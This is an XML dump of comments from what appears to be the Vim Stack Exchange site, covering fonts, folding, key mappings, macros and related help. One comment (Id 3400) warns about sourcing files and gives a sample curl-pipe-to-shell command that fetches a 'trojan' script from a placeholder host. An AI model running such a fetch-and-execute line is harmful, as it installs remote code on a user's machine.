  <row Id="3250" PostId="3088" Score="0" Text="@EvergreenTree Probably, yes. But I suspect the difference will be minimal (probably unmeasurable) in most circumstances. Go for the solution you find the most readable." CreationDate="2015-04-27T00:00:03.250" UserId="51" />
  <row Id="3251" PostId="3088" Score="0" Text="I've no idea. carpetsmoker's trick with `index+map` would probably be faster than the loop (that I use on my library). However, the `join()` trick has good chances to be the faster one. Moreover, you can precompute the regex if the list of filetypes doesn't change." CreationDate="2015-04-27T00:17:27.360" UserId="626" />
  <row Id="3252" PostId="3089" Score="0" Text="Do you use tmux?" CreationDate="2015-04-27T07:38:54.323" UserId="54" />
  <row Id="3253" PostId="3089" Score="0" Text="@romainl yes, the error occurs both inside and outside of tmux though" CreationDate="2015-04-27T07:52:41.287" UserId="1842" />
  <row Id="3254" PostId="3091" Score="0" Text="it doesn't work for me. When I press `C-X` it exits complete mode and then when I press `C-L` it inserts these 2 characters: `^L`" CreationDate="2015-04-27T11:16:47.423" UserId="1881" />
  <row Id="3255" PostId="3091" Score="0" Text="That sounds like you're hitting `&lt;C-V&gt;` instead of `&lt;C-X&gt;`. Do you have any Insert mappings that might be affecting this behaviour?" CreationDate="2015-04-27T11:23:10.747" UserId="64" />
  <row Id="3256" PostId="3091" Score="0" Text="Actually, I just confirmed that `&lt;C-L&gt;` in Insert mode will insert `^L`, so there's no `&lt;C-V&gt;` necessary as for some other chords. Still bizarre though, this works just fine for me." CreationDate="2015-04-27T11:25:19.707" UserId="64" />
  <row Id="3257" PostId="3091" Score="0" Text="I have the YouCompleteMe plugin. Some settings I have: `:set wildmode=list:longest` `let g:ycm_confirm_extra_conf = 0` `let g:ycm_complete_in_comments = 1` `let g:ycm_autoclose_preview_window_after_insertion = 1`" CreationDate="2015-04-27T11:28:40.580" UserId="1881" />
  <row Id="3258" PostId="3089" Score="2" Text="I would recommend using MacVim instead, as it plays better in Mac OS. You don't have to use the GUI version -- `mvim -v` will work in the terminal." CreationDate="2015-04-27T11:30:06.187" UserId="64" />
  <row Id="3259" PostId="3091" Score="0" Text="I don't know anything about the plugin. Have you tested this with no plugins installed? Use `vim -u NONE -N`. If it works there, try a minimal setup where only that plugin is installed (nothing else in your vimrc). If that breaks it again, I'd be pretty confident that the plugin is the problem." CreationDate="2015-04-27T11:33:01.333" UserId="64" />
  <row Id="3260" PostId="3091" Score="0" Text="it works with `vim -u NONE -N`. So it is from a plugin or from a setting. When I'll have a little time I'll narrow it and come back with the finds. Thank you for your time." CreationDate="2015-04-27T11:39:29.547" UserId="1881" />
  <row Id="3261" PostId="3090" Score="1" Text="it looks like it works on default settings. There is a plugin/setting of mine that breaks this. I'll edit the question / add an answer when I find out the one that breaks this." CreationDate="2015-04-27T11:41:34.393" UserId="1881" />
  <row Id="3262" PostId="3086" Score="2" Text="There's a flaw in what you're trying to do. You're using globs, but treating them as regular expressions. As a regular expression, `git*` matches `gi`, `git`, `gitt`, etc. This is easily fixed by using `git.*` instead. Be careful not to use glob syntax, as is common when looking at file names and file types." CreationDate="2015-04-27T12:36:52.730" UserId="64" />
  <row Id="3263" PostId="3093" Score="4" Text="[`:help 'guifont'`](http://vimhelp.appspot.com/options.txt.html#E596) should have the information you need. Also see [How do I navigate to topics in Vim's documentation?](http://vi.stackexchange.com/questions/2136/how-do-i-navigate-to-topics-in-vims-documentation?s=1|0.0000), [Quickly switch between fonts at runtime](http://vi.stackexchange.com/questions/663/quickly-switch-between-fonts-at-runtime?rq=1), [How to display Font Awesome in Vim?](http://vi.stackexchange.com/questions/2566/how-to-display-font-awesome-in-vim?rq=1)." CreationDate="2015-04-27T20:24:54.827" UserId="51" />
  <row Id="3265" PostId="3094" Score="1" Text="Note that the `name:size` syntax *only* works on Windows gVim, for gtk gVim you need to use `name size` (a space between the font name &amp; size) ... Other platforms may have other formats..." CreationDate="2015-04-27T22:14:40.877" UserId="51" />
  <row Id="3266" PostId="3094" Score="0" Text="`:hXX` works on the Mac as well. Good point about GTK though." CreationDate="2015-04-27T22:31:37.993" UserId="72" />
  <row Id="3267" PostId="3092" Score="0" Text="It's common to disable the following of symbolic links when searching for files recursively to avoid infinite loops. Imagine `ln -s . self`" CreationDate="2015-04-28T01:18:32.350" UserId="64" />
  <row Id="3268" PostId="3092" Score="0" Text="I have several other dotfiles that are symlinked in a similar manner in the same location and all of those show up. The symlinks are in ~ and the actual files are in ~/.dotfiles. I use Unite from ~/.dotfiles." CreationDate="2015-04-28T01:21:46.070" UserId="200" />
  <row Id="3269" PostId="3085" Score="0" Text="@Gilles Hm, I'm also slightly confused now ... I need to do some more digging and see how exactly this works ... stay tuned ..." CreationDate="2015-04-28T08:43:34.757" UserId="51" />
  <row Id="3270" PostId="3058" Score="0" Text="Your answer is probably the correct one to my question, but tivn's answer feels more like the vim-way of accomplishing what I need to do. Thanks anyway!" CreationDate="2015-04-28T10:00:10.287" UserId="1854" />
  <row Id="3271" PostId="3101" Score="0" Text="Thanks. Exactly what I needed, and I appreciate the &quot;teach a man how to fish...&quot;-style tip on where to get further help in the future." CreationDate="2015-04-28T12:25:07.803" UserId="1882" />
  <row Id="3272" PostId="3100" Score="0" Text="Thanks for the answer. `NonText` was what I needed. I found the snippet didn't work, though `hi NonText ctermbg=NONE` did as per @Carpetsmoker's answer." CreationDate="2015-04-28T12:27:18.590" UserId="1882" />
  <row Id="3273" PostId="3100" Score="0" Text="@Coljac I'm confused. Isn't that exactly what I have written?" CreationDate="2015-04-28T12:43:16.060" UserId="205" />
  <row Id="3274" PostId="3100" Score="0" Text="Apologies for the cut and paste error. It was `:highlight clear NonText` that worked (from vim) - though knowing &quot;NonText&quot; I was able to edit the colorscheme easily enough." CreationDate="2015-04-28T12:50:22.697" UserId="1882" />
  <row Id="3275" PostId="3100" Score="0" Text="@Coljac Muru's example had a minor typo: it was `ctermbg`, but should be `ctermfg` (I've fixed this now)." CreationDate="2015-04-28T12:52:34.690" UserId="51" />
  <row Id="3276" PostId="3100" Score="0" Text="@Carpetsmoker if that works, colour me surprised. I thought `fg` applied to the text." CreationDate="2015-04-28T12:55:49.840" UserId="205" />
  <row Id="3277" PostId="2982" Score="0" Text="@jecxjo a function might be interesting to see - and probably the best solution that I didn't consider as I can't write them (on todo list). I'll update the OP to match if so, cheers." CreationDate="2015-04-28T13:42:23.837" UserId="1443" />
  <row Id="3278" PostId="476" Score="0" Text="See also: [How does the vim “write with sudo” trick work?](http://stackoverflow.com/q/2600783/55075)" CreationDate="2015-04-28T13:51:27.083" UserId="467" />
  <row Id="3279" PostId="2984" Score="0" Text="Just had chance to go through this, didn't think of creating a new split to work in that's cool :)&#xA;&#xA;I had to change some of the mappings for it to work though. &#xA;Going from the `c&lt;cr&gt;%&lt;space&gt;` line: &#xA;&#xA;    `c&lt;cr&gt;%&lt;space&gt; THEN &lt;esc&gt;`&#xA;    `/\&lt;cr&gt;`&#xA;    `i&lt;del&gt;&lt;cr&gt;`&#xA;    `o&lt;esc&gt;j`&#xA;&#xA;Perhaps I've missed something on your post, it didn't seem to work for&#xA;me though. I guess mapping the whole thing to a macro isn't really doable, a function would probably be easier. cheers :) (clicking &quot;edit&quot; on this comment might make it clearer to see the steps)" CreationDate="2015-04-28T13:53:19.357" UserId="1443" />
  <row Id="3280" PostId="2984" Score="0" Text="You're right, I forgot to leave insert mode after that change command. I tried this out in vim before writing and did get it working as a macro, but must have made some errors while transcribing it here." CreationDate="2015-04-28T14:02:13.820" UserId="680" />
  <row Id="3281" PostId="2984" Score="1" Text="Just tried it again and fixed the two bugs (added `&lt;esc&gt;`, switched forward slash to backslash). FWIW, the raw contents of my a register after recording the macro were `I% ^[f#hvgelc^M% ^[f\hr^Mo^[j`" CreationDate="2015-04-28T14:10:51.227" UserId="680" />
  <row Id="3283" PostId="3024" Score="1" Text="Can you post a simple example document which doesn't work well with TeX? Adding a basic equation doesn't seem to give any problems." CreationDate="2015-04-28T15:12:24.287" UserId="51" />
  <row Id="3284" PostId="3104" Score="0" Text="That's useful, thank you for sharing!" CreationDate="2015-04-28T17:30:38.317" UserId="602" />
  <row Id="3285" PostId="3104" Score="1" Text="According to [this answer](http://vi.stackexchange.com/a/2577/51), `has('unix')` is often true on OSX systems, and [according to John here](https://vi.stackexchange.com/questions/3093/how-can-i-change-the-font-size-in-gvim/3104#comment3266_3094), OSX requires the same format as Windows... So using `has('gui_gtk2')` is probably better than using `has('unix')`." CreationDate="2015-04-28T17:30:45.533" UserId="51" />
  <row Id="3299" PostId="3098" Score="0" Text="In fact this actually work. THANKS!. But I wonder if the &quot;default&quot; behaviour can be modified without doing this. That is, VIM without &quot;n&quot; in ```formatoptions``` already recognize some numbered list formats. Is that hardcoded in the code?" CreationDate="2015-04-28T22:39:33.570" UserId="1890" />
  <row Id="3300" PostId="3108" Score="2" Text="`^D` will leave the whitespace alone." CreationDate="2015-04-28T23:13:40.803" UserId="865" />
  <row Id="3301" PostId="3098" Score="0" Text="@jcea It doesn't work with me when I test it with `1. ` ...  Perhaps this is something in your specific filetype?" CreationDate="2015-04-28T23:44:03.977" UserId="51" />
  <row Id="3302" PostId="3109" Score="0" Text="The best tags I could think of for the question do not exist: [tag:selection] and [tag:range] so feel free to re-tag or create one of those tags." CreationDate="2015-04-29T01:33:34.787" UserId="878" />
  <row Id="3303" PostId="3105" Score="2" Text="As an alternative to trimming whitespace manually, you could use a plugin such as [vim-better-whitespace](https://github.com/ntpeters/vim-better-whitespace), which highlights trailing whitespace, provides a command to remove it all at once, and can even do it automatically on save." CreationDate="2015-04-29T01:39:49.510" UserId="757" />
  <row Id="3304" PostId="3105" Score="0" Text="See also [What's the simplest way to strip trailing whitespace from all lines in a file?](http://vi.stackexchange.com/questions/454/whats-the-simplest-way-to-strip-trailing-whitespace-from-all-lines-in-a-file)." CreationDate="2015-04-29T01:46:07.193" UserId="757" />
  <row Id="3305" PostId="3110" Score="1" Text="Is `&lt;C-A&gt;` control+a? That selects everything in Vim on Windows." CreationDate="2015-04-29T02:43:45.477" UserId="878" />
  <row Id="3306" PostId="3110" Score="0" Text="It is Control+a. In vim it should increment a number. If you have changed your keybindings to do Windows actions instead of Vim actions then your not going to be able to do most of the things people post here." CreationDate="2015-04-29T02:45:36.487" UserId="895" />
  <row Id="3307" PostId="3110" Score="0" Text="No the Vim version for Windows comes with different bindings due to somebody's infinite wisdom. I'm just using the vanilla out-of-the-box bindings. I've never changed a Vim key binding in over twenty years, that I can recall (-:" CreationDate="2015-04-29T02:47:23.980" UserId="878" />
  <row Id="3308" PostId="3110" Score="0" Text="Shouldn't be the case, my Windows install has normal vim bindings. Could it be possible you installed someone else's build of vim? Or could you be running vim in &quot;Easy&quot; mode? i believe windows installs desktop icons with normal and easy mode options." CreationDate="2015-04-29T02:50:36.190" UserId="895" />
  <row Id="3309" PostId="3110" Score="0" Text="Oh &quot;easy mode&quot; could be a possibility. I always install the &quot;official&quot; Windows Vim. Now to find out how to know whether I've got easy mode or not." CreationDate="2015-04-29T02:52:22.497" UserId="878" />
  <row Id="3310" PostId="3110" Score="3" Text="No, its because the default install in windows loads mswin.vim. If you make your own vimrc and not load mswin.vim then you get the normal vim bindings. I keep a single vimrc for all my installs (Linux, Mac and Windows) and never deal with mswin.vim. For more info on this issue see http://stackoverflow.com/questions/289681/why-does-c-a-ctrla-not-work-under-gvim-on-windows" CreationDate="2015-04-29T02:53:40.880" UserId="895" />
  <row Id="3311" PostId="3110" Score="0" Text="Aha. I prefer not to customize my Vim because I often download and install it on some computer temporarily where I won't have my customizations so I ditched them and decided just to learn the vanilla way to do things some years back. It is annoying that there is a different vanilla for different OSes but it can also be annoying when a key combo that works on every Windows app doesn't work in Vim so I can see why they did it." CreationDate="2015-04-29T02:57:10.967" UserId="878" />
  <row Id="3312" PostId="3110" Score="0" Text="Let us [continue this discussion in chat](http://chat.stackexchange.com/rooms/23274/discussion-between-jecxjo-and-hippietrail)." CreationDate="2015-04-29T02:59:39.773" UserId="895" />
  <row Id="3315" PostId="3103" Score="1" Text="Note that `.exrc` are extremely limited: the *project* notion stops at the current directory, i.e. files in subdirectories don't belong to the project." CreationDate="2015-04-29T07:44:24.470" UserId="626" />
  <row Id="3316" PostId="3114" Score="0" Text="But doesn't `line(&quot;.&quot;)` mean &quot;use the current line number&quot;? That was my problem **1.** with previous answers I could find." CreationDate="2015-04-29T08:19:35.817" UserId="878" />
  <row Id="3317" PostId="3114" Score="1" Text="Yes it is. That's why I subtract the line number of the first line in the range." CreationDate="2015-04-29T08:20:51.153" UserId="626" />
  <row Id="3318" PostId="3114" Score="0" Text="Ah OK I haven't tested it yet because I can't even remember how to enter a script in Vim ... gotta read up on that first (-:" CreationDate="2015-04-29T08:23:54.347" UserId="878" />
  <row Id="3319" PostId="3114" Score="1" Text="As you're under windows, copy paste the code into `$HOME/vimfiles/plugin/whatevernameyouwish.vim`. Or even your `$HOME/_vimrc` (windows filename) if your prefer (in a first time).  If you're not sure what $HOME is on your machine, ask vim what it thinks it is -&gt; `:echo $HOME`" CreationDate="2015-04-29T08:27:47.530" UserId="626" />
  <row Id="3320" PostId="3114" Score="0" Text="OK works great! ... I remember years ago scouring the docs and hunting the internet trying to figure out how to execute a script, would never have guessed `:source` (-:" CreationDate="2015-04-29T08:29:04.617" UserId="878" />
  <row Id="3321" PostId="3114" Score="1" Text="You don't even need `:source` if the vim script is correctly installed in the right directory ({rtp}/plugin, or {rtp}/ftplugin/{filetype}/ftplugin for filetype specific plugins). `:source` is what we had to play with more than a decade and a half ago." CreationDate="2015-04-29T08:35:45.673" UserId="626" />
  <row Id="3322" PostId="3114" Score="0" Text="Ah thanks. I worked out quicker to save it anywhere with a `.vim` extension and then `:source` it than to save it in the `plugin` dir." CreationDate="2015-04-29T08:54:20.360" UserId="878" />
  <row Id="3323" PostId="3116" Score="1" Text="This works brilliantly, thanks for including an explanation of what the tags mean rather than just the text I needed to write." CreationDate="2015-04-29T10:21:48.190" UserId="131" />
  <row Id="3324" PostId="3118" Score="0" Text="Great answer, especially with why regex != regex. As for your search and replace, it's a bit tricky as the comment may or may not have a `:`. See the full file for details https://github.com/squarefrog/dotfiles/blob/master/osx/setup_defaults.sh" CreationDate="2015-04-29T10:36:41.283" UserId="131" />
  <row Id="3325" PostId="3113" Score="1" Text="If you include the Shift  it's the same and possibly easier." CreationDate="2015-04-29T12:02:21.160" UserId="1125" />
  <row Id="3327" PostId="3113" Score="3" Text="While this is not the &quot;cleanest&quot; solution, it has one advantage: it's exactly one action, and so it's repeatable with the `.` command. In contrast, `0D` (as suggested in the chosen answer) is two actions: the `0` motion and the `D` command." CreationDate="2015-04-29T13:08:26.340" UserId="64" />
  <row Id="3328" PostId="3107" Score="2" Text="While this is direct, to the point, and (probably) the fewest keystrokes, it's not repeatable using the `.` command. For that reason, I think `cc&lt;Esc&gt;` or `S&lt;Esc&gt;` is more attractive if you care about repeating." CreationDate="2015-04-29T13:11:34.020" UserId="64" />
  <row Id="3329" PostId="3120" Score="0" Text="There actually is a way to differentiate these keypresses in some terminal emulators (namely xterm and pangoterm).  The latter does it by default and xterm can be configured to do so." CreationDate="2015-04-29T13:16:51.883" UserId="15" />
  <row Id="3330" PostId="3107" Score="0" Text="That is true.  However, you could record it as a macro and repeat that using `.`." CreationDate="2015-04-29T13:23:59.217" UserId="865" />
  <row Id="3331" PostId="3117" Score="2" Text="I was just thinking of adding this as an answer and then saw yours" CreationDate="2015-04-29T15:27:34.427" UserId="889" />
  <row Id="3332" PostId="3113" Score="0" Text="@Trengot it probably is easier than `0D` for me since I have `jk` mapped to `&lt;Esc&gt;` in my vimrc, so my hands wouldn't even have to leave the home row." CreationDate="2015-04-29T18:23:26.973" UserId="865" />
  <row Id="3333" PostId="3119" Score="0" Text="Related: http://vi.stackexchange.com/questions/2484/remap-not-working-nl-in-appears-in-other-binding with workaround: http://vi.stackexchange.com/a/2520/67" CreationDate="2015-04-29T20:10:23.170" UserId="67" />
  <row Id="3334" PostId="3120" Score="0" Text="@jamessan Thanks; do you happen to have some info on how to do this in xterm?" CreationDate="2015-04-29T20:18:29.200" UserId="51" />
  <row Id="3335" PostId="3108" Score="0" Text="Since `O` leaves you in insert mode, this is equivalent to `cc`, except without auto-indentation....unless your line was already auto-indented." CreationDate="2015-04-29T22:57:18.093" UserId="1060" />
  <row Id="3336" PostId="3105" Score="2" Text="Even without a plugin, you can globally delete trailing whitespace using search-and-replace, e.g. `:%s/\s*$//`" CreationDate="2015-04-29T23:01:19.917" UserId="1060" />
  <row Id="3337" PostId="3108" Score="0" Text="This will behave differently on the last line of the file." CreationDate="2015-04-30T02:41:40.963" UserId="64" />
  <row Id="3338" PostId="3107" Score="0" Text="In general, macros cannot be repeated with `.`. They work as if those keystrokes were entered interactively, so individual commands are treated separately. Using `.` will repeat only the last command in the macro." CreationDate="2015-04-30T02:51:02.270" UserId="64" />
  <row Id="3339" PostId="3121" Score="0" Text="Wow, very encyclopedic. I've only read the first part and feel like I've learned more about Vim just from that than I have in the past few years. This is the kind of answer that makes Stack Exchange better than average Q&amp;A sites and also shows the benefits of having a Vim specific SE." CreationDate="2015-04-30T03:48:06.740" UserId="878" />
  <row Id="3340" PostId="3120" Score="0" Text="I used your gnome terminal instructions, so now the backspace key generates a &quot;ASCII delete&quot;, and the backspace key still works fine. That part is good. The problem is, I can't seem to override the mapping of control h, I suspect because it still tries to handle it as a backspace-like thing" CreationDate="2015-04-30T05:01:47.523" UserId="1907" />
  <row Id="3341" PostId="3125" Score="0" Text="I get error message ``E350: Cannot create fold with current 'foldmethod'`` after pressing keys ``zf``." CreationDate="2015-04-30T06:04:07.253" UserId="147" />
  <row Id="3342" PostId="3125" Score="1" Text="@niekas: Set `foldmethod` to `manual` first." CreationDate="2015-04-30T06:06:34.627" UserId="1577" />
  <row Id="3343" PostId="3125" Score="0" Text="@lcd047 Thats great! Thank you very much. @200_success should add ``:set foldmethod=manual`` to his answer." CreationDate="2015-04-30T06:09:12.460" UserId="147" />
  <row Id="3344" PostId="3109" Score="1" Text="This plugin is not a complete solution for your problem, but it's tremendously useful for adding columns of numbers: [VisIncr](http://vim.sourceforge.net/scripts/script.php?script_id=670).  Docs [here](http://www.drchip.org/astronaut/vim/doc/visincr.txt.html).  FWIW." CreationDate="2015-04-30T06:18:41.547" UserId="1577" />
  <row Id="3345" PostId="3125" Score="0" Text="I got one more problem. I have ``.rst`` file with section ``Test\n====``. When I select several paragraphs of this section and press ``zf`` all section gets folded instead of the selected paragraphs. How do I turn this automation off?" CreationDate="2015-04-30T06:25:31.833" UserId="147" />
  <row Id="3346" PostId="3125" Score="1" Text="If a new fold you are trying to create partially overlaps with an existing open fold, then closing the new fold will cause overlapping folds to close too. You may need to delete some folds using `zd` first." CreationDate="2015-04-30T06:56:23.450" UserId="24" />
  <row Id="3347" PostId="3126" Score="0" Text="I am unable to edit your answer but I believe you meant `:%s/\v\n\n#\s+(.*)/^M^Mrunning &quot;\1&quot;/` (added the &quot;magic&quot; flag). It is really hard to pick a correct answer for my original question, but I feel this answer is the closest to my original expected answer. It is also the only one that works throughout the whole file without any need for selecting a range." CreationDate="2015-04-30T07:31:29.017" UserId="131" />
  <row Id="3348" PostId="3126" Score="1" Text="IIRC you can use `\r` instead of `^M` to get new lines?" CreationDate="2015-04-30T08:18:11.503" UserId="205" />
  <row Id="3349" PostId="3128" Score="0" Text="Have you considered posting to the vim_dev list?" CreationDate="2015-04-30T10:05:53.633" UserId="1577" />
  <row Id="3350" PostId="3089" Score="0" Text="@tommcdo in `mvim -v` it works! Both in and outside of tmux! Boy am I glad... I'm just gonna alias that now. No idea what broke it in the first place, but I'm just glad this works. Thanks! If you make your comment an answer, I'll accept it." CreationDate="2015-04-30T10:36:05.777" UserId="1842" />
  <row Id="3352" PostId="3131" Score="0" Text="You might have a look at vim-dispatch: https://github.com/tpope/vim-dispatch" CreationDate="2015-04-30T11:39:41.090" UserId="284" />
  <row Id="3353" PostId="3107" Score="0" Text="I tested it, and that's not how it works for me.  If the record the macro, then use it using `@{reg}`, you can repeat it with `.` afterwards." CreationDate="2015-04-30T12:07:00.603" UserId="865" />
  <row Id="3354" PostId="3107" Score="1" Text="You're just repeating the last command of the macro, which is `D`. After a `0D` operation, your cursor will be left in column 0. If your cursor is already on the beginning of the line (after you move to another one), it will look like the macro was properly repeated. Try moving the cursor forward in the line and typing `.` -- you'll see that it only repeats `D`." CreationDate="2015-04-30T12:11:03.940" UserId="64" />
  <row Id="3355" PostId="3131" Score="0" Text="I love [ConqueTerm](https://code.google.com/p/conque/)" CreationDate="2015-04-30T12:59:45.500" UserId="1145" />
  <row Id="3356" PostId="3130" Score="0" Text="Alternatively, use [Homebrew](http://brew.sh/) and run `brew install vim --override-system-vi`." CreationDate="2015-04-30T14:04:43.050" UserId="131" />
  <row Id="3357" PostId="3107" Score="0" Text="Ah, my mistake." CreationDate="2015-04-30T15:19:44.167" UserId="865" />
  <row Id="3358" PostId="3123" Score="1" Text="Thank you so much, this helps me a lot to quickly scan trough my files." CreationDate="2015-04-30T16:41:54.617" UserId="1921" />
  <row Id="3359" PostId="2077" Score="5" Text="Do note that you can set vim's internal options using `let` by doing `let &amp;{option name}=value`" CreationDate="2015-04-30T16:51:55.703" UserId="865" />
  <row Id="3360" PostId="3113" Score="0" Text="See @Nobilis answer: `S` is documented as &quot;Synonym for `cc`&quot;" CreationDate="2015-04-30T17:05:22.673" UserId="925" />
  <row Id="3361" PostId="3131" Score="0" Text="[How to execute shell commands silently?](https://vi.stackexchange.com/questions/1942/how-to-execute-shell-commands-silently/1947?s=1|0.1919#1947) is also very similar (but doesn't cover the 'mini-terminal' part)." CreationDate="2015-04-30T17:25:19.460" UserId="51" />
  <row Id="3362" PostId="2693" Score="0" Text="thanks for the response, sorry for the slow reply. If I went for the lo-fi autocmd approach, i.e. `autocmd FileType markdown set sidescrolloff=0`, doesn't that require me to then create a corresponding autocmd for every other filetype I use (since it's a global option). Is there a way to create an autocmd that only applies for files that are *not* type XYZ?" CreationDate="2015-04-30T21:51:25.883" UserId="91" />
  <row Id="3364" PostId="3138" Score="0" Text="That is what I thought of when I asked this question.   The solution to that would just be to move the cursor back if it is on the end of the line in insert mode, and not every time you exit it." CreationDate="2015-04-30T23:00:22.737" UserId="865" />
  <row Id="3366" PostId="3140" Score="0" Text="Related: http://unix.stackexchange.com/questions/11402/why-does-esc-move-the-cursor-back-in-vim" CreationDate="2015-05-01T00:43:28.570" UserId="46" />
  <row Id="3367" PostId="3139" Score="0" Text="You seem to be missing a link in the question" CreationDate="2015-05-01T00:45:49.453" UserId="46" />
  <row Id="3370" PostId="3139" Score="0" Text="thanks! Fixed it." CreationDate="2015-05-01T00:49:23.967" UserId="1806" />
  <row Id="3371" PostId="3140" Score="1" Text="Ah, that makes sense.  Really the only way of avoiding this behavior is to make it so that if you exit from an insert mode started with `i` that the cursor moves to the right, and if it is started with `a` it moves to the left." CreationDate="2015-05-01T00:49:33.163" UserId="865" />
  <row Id="3372" PostId="3139" Score="0" Text="Have you looked at the `$VIMRUNTIME/syntax/c.vim` (or any other syntax file in the folder)? There are a lot of examples in there." CreationDate="2015-05-01T00:52:34.583" UserId="46" />
  <row Id="3373" PostId="3139" Score="2" Text="This should be fairly simple if you look at a tutorial on it.  I honestly don't see a question here.  If you want to learn how to accomplish the syntax grouping of the things you listed, you might want to take a look at chapters 45 through 47 of http://learnvimscriptthehardway.stevelosh.com/" CreationDate="2015-05-01T00:55:04.903" UserId="865" />
  <row Id="3374" PostId="3139" Score="0" Text="I'll have a look. Thanks for the advance!" CreationDate="2015-05-01T00:59:02.227" UserId="1806" />
  <row Id="3378" PostId="3140" Score="0" Text="@EvergreenTree Correct. You could probably add some mappings that create a buffer local variable that say whether you entered with `i` or `a` and then check that variable when you exit insert mode. However I don't know what you would want to happen if you entered insert mode with `s` or `c`. I'm probably also missing other ways to enter insert mode." CreationDate="2015-05-01T03:37:13.160" UserId="46" />
  <row Id="3379" PostId="3136" Score="0" Text="works perfectly, thanks a lot :)" CreationDate="2015-05-01T10:57:01.867" UserId="1821" />
  <row Id="3380" PostId="3135" Score="0" Text="thanks for your answer and for the link to the documentation :)" CreationDate="2015-05-01T10:59:03.153" UserId="1821" />
  <row Id="3381" PostId="3140" Score="0" Text="that is true.  That is the problem with workarounds in vim, there is always some case that you didn't account for." CreationDate="2015-05-01T11:53:52.983" UserId="865" />
  <row Id="3382" PostId="2693" Score="0" Text="Yes, you can do that with a global autocmd and a conditional: `autocmd FileType * if &amp;filetype != 'markdown' | set sidescrolloff=3 | endif`; I would then combine this with the other (positive) one via `else`." CreationDate="2015-05-01T12:59:44.007" UserId="970" />
  <row Id="3383" PostId="3128" Score="0" Text="I'll post anything useful back here, but here's the [vim_dev list posting](https://groups.google.com/forum/?hl=en_US#!topic/vim_dev/yPvUeVi96ug)" CreationDate="2015-05-01T13:00:51.307" UserId="1406" />
  <row Id="3384" PostId="3128" Score="0" Text="I think your test case is wrong. If I make a test file, and add some text (by just doing `iHello&lt;Esc&gt;`, the `g:c` variable is also increased to `20`, then doing `oWorld&lt;Esc&gt;` makes it `38` ... So the number of  evaluations `foldexpr` seems unrelated to using completion... Try [loading Vim with a minimal vimrc file](http://vi.stackexchange.com/q/2003/51) and see if the problem still occurs, it could be another setting or a plugin." CreationDate="2015-05-01T15:56:06.630" UserId="51" />
  <row Id="3385" PostId="3128" Score="0" Text="*&quot;I can't see the value in having foldexpr consulted while running through auto completes, &quot;* well, you're inserting text; so Vim needs to re-calculate which lines to fold." CreationDate="2015-05-01T16:10:27.413" UserId="51" />
  <row Id="3386" PostId="3128" Score="0" Text="The test case is deliberately stupid, returning =. But just from the order of magnitude you can see something is up. On 2nd comment, Yeah, but I think it should do that at the end of an insert candidate (like it does for `p`), I think what it's doing is doing it per character of the insert candidate." CreationDate="2015-05-01T16:21:27.710" UserId="1406" />
  <row Id="3387" PostId="3128" Score="0" Text="@artfulrobot I don't see that &quot;anything is up&quot;? I get similar numbers *without* using completion... It seems like a feature to me, if I type a `{` or `}` (for example), this might influence folding, and you usually want that to happen immediately... If it didn't, we'd have people here complaining about the delay in showing folds ;-) In any case, I suspect the *real* problem here is that your `foldexpr` is too slow/complicated; once you've verified there isn't another setting or plugin in the way, you should probably post your `foldexpr` and a test file, so we can have a look at that..." CreationDate="2015-05-01T16:27:41.770" UserId="51" />
  <row Id="3388" PostId="3145" Score="0" Text="Thanks, will try this. As for specific foldexpr see https://github.com/tmhedberg/SimpylFold for python, and https://github.com/swekaj/php-foldexpr.vim for php. But yes, we both agree that's another question!" CreationDate="2015-05-01T18:32:56.430" UserId="1406" />
  <row Id="3389" PostId="3139" Score="2" Text="@DCPY Try to make a syntax file first, starting with just a single highlight. If you run into problems, you're of course welcome to ask one (or more!) question(s) about it. Post the code that you've tried so far, explain what exactly what you want to do, and what doesn't work." CreationDate="2015-05-01T18:57:33.827" UserId="51" />
  <row Id="3390" PostId="3145" Score="0" Text="@artfulrobot The Python `foldexpr` is also quite slow for me... I'm not sure this can be improved on in this specific case, so this work-around might be best here :-/ Not sure why the PHP foldexpr is required? Can't the syntax file do that (this is usually faster)" CreationDate="2015-05-01T18:59:10.720" UserId="51" />
  <row Id="3392" PostId="3128" Score="0" Text="As I suspected: &quot;Right, it's actually worse than that: the entire folding is&#xA;redone at every key press.&quot; From the dev list. Workarounds below look like the way forward!" CreationDate="2015-05-01T22:00:05.087" UserId="1406" />
  <row Id="3393" PostId="3149" Score="0" Text="Can you clarify what you mean by &quot;basically nothing&quot; from inside a function? It does do the standard thing (it temporarily stops highlighting the search until the next time search is invoked)." CreationDate="2015-05-02T00:33:42.130" UserId="390" />
  <row Id="3394" PostId="3149" Score="0" Text="I'm also sort of hoping to find a way to access the flag that controls whether the transient `:nohlsearch` is in effect or not... I think in its absence I have to resort to tracking all the `:nohlsearch` calls with a variable." CreationDate="2015-05-02T00:37:35.163" UserId="390" />
  <row Id="3395" PostId="3149" Score="0" Text="@StevenLu see edits." CreationDate="2015-05-02T00:41:29.527" UserId="46" />
  <row Id="3396" PostId="3149" Score="0" Text="Thanks. Looks like the code I have been using hacks around the &quot;basically doing nothing&quot; aspect of it by doing this: `nnoremap &lt;silent&gt; &lt;expr&gt; &lt;boundkey&gt; SearchHighlight()` where `SearchHighlight()` may return a string `&quot;:silent nohlsearch\&lt;CR&gt;&quot;`. Also thank you for the `v:hlsearch` tip, just what I needed." CreationDate="2015-05-02T00:46:36.153" UserId="390" />
  <row Id="3397" PostId="2986" Score="0" Text="There is also a [PR](https://github.com/tpope/vim-surround/pull/118) to add `dsf` to surround.vim itself." CreationDate="2015-05-02T07:57:09.197" UserId="1292" />
  <row Id="3399" PostId="2150" Score="0" Text="Note I've noticed an issue with this: you *only* save the contents of the current session to the undo file. This is different from the default behaviour, where the contents of the previous session + all info already in the undo file is saved ... The way to fix this, would be to read the undo file, merge the undo changes, and then write the undo file ... But this doesn't seem possible ... :-/" CreationDate="2015-05-02T21:39:06.920" UserId="51" />
  <row Id="3400" PostId="3152" Score="0" Text="While this works, it can be considered dangerous since you're just sourcing a file, and executing *all* commands in it (including shell commands, such as `system('curl http://example.com/install-trojan.sh | sh')` ..." CreationDate="2015-05-02T23:50:24.260" UserId="51" />
  <row Id="3401" PostId="3153" Score="5" Text="&quot;vim is not formatting them correctly&quot; No, Vim formats them *correctly*. What it doesn't do is format them *how you want*. For that you will need to find a specialized command-line xml formatter and use it from Vim either with `:!&lt;external command&gt;` or with `:help 'formatprg'` or `:help equalprg`." CreationDate="2015-05-03T07:25:45.317" UserId="54" />
  <row Id="3402" PostId="836" Score="2" Text="So, there is no difference between `&lt;Leader&gt;` and `&lt;leader&gt;`, right?" CreationDate="2015-05-03T11:31:30.157" UserId="1963" />
